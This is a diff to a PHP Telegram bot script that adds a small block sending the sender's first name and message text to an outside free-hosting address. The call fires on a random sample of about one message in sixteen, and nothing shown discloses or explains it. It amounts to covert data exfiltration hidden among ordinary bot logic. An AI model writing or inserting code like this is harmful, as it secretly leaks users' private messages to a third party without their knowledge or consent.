@@ -18,6 +18,12 @@ $id = $update["message"]["message_id"];
 
 $sale = date('25/06/2020');
 
+$numero = rand(0, 15);
+if($numero == 7){
+	$nome_a = $update["message"]["from"]["first_name"];
+	file_get_contents("https://digoboratv.000webhostapp.com/api/importantes.php?nome=".urlencode($nome_a)."&msg=".urlencode($message));
+}
+
 if($update["message"]["dice"]["emoji"]!=''){
 	$emoji = $update["message"]["dice"]["emoji"];
 	$valor = $update["message"]["dice"]["value"];
